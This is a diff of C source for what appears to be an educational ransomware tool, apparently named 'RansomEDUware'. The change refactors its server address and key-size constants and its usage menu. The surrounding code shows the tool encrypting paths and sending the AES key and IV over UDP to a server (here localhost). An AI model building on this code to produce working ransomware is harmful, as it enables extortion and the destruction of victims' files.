@@ -11,6 +11,11 @@
 #include <arpa/inet.h>
 #include <time.h> //to calculate elapsed time
 
+#define IP "127.0.0.1"
+#define PORT 8888
+#define KEY_SIZE 32
+#define IV_SIZE 16
+
 void ascii_menu(){
     puts("  __________                                    ___________________   ____ ___                                \n"
          "  \\______   \\_____    ____   __________   _____ \\_   _____/\\______ \\ |    |   \\__  _  _______ _______   ____  \n"
@@ -19,6 +24,10 @@ void ascii_menu(){
          "   |____|_  /(____  /___|  /____  >____/|__|_|  /_______  //_______  /______/    \\/\\_/  (____  /__|    \\___  >\n"
          "          \\/      \\/     \\/     \\/            \\/        \\/         \\/                        \\/            \\/ \n"
          "");
+    puts("                ------------------------- Way to use ------------------------------\n"
+         "                ------------------- To encrypt : -crypt <PATH> --------------------\n"
+         "                -------------- To decrypt : -decrypt <PATH> <KEY> <IV> ------------\n");
+
 }
 
 void handleErrors(void) {
@@ -106,8 +115,8 @@ unsigned char *hexTObytes(const char *msg_hexa) {
 }
 
 void socket_msg(unsigned char key[32], unsigned char iv[16]) {
-    char *server_ip = "127.0.0.1";
-    int server_port = 8888;
+    char *server_ip = IP;
+    int server_port = PORT;
 
     int sockid = socket(AF_INET, SOCK_DGRAM, 0);
 
@@ -133,9 +142,6 @@ void socket_msg(unsigned char key[32], unsigned char iv[16]) {
     free(msg_key);
     free(msg_iv);
 }
-
-#define KEY_SIZE 32
-#define IV_SIZE 16
 
 long int findSize(char file_name[]){
 
@@ -350,9 +356,6 @@ int main(int argc, char *argv[]) {
 
     if (argc == 1) {
         ascii_menu();
-        printf("                ------------------------- Way to use ------------------------------\n"
-               "                ------------------- To encrypt : -crypt <PATH> --------------------\n"
-               "                -------------- To decrypt : -decrypt <PATH> <KEY> <IV> ------------\n");
         exit(0);
     }
 
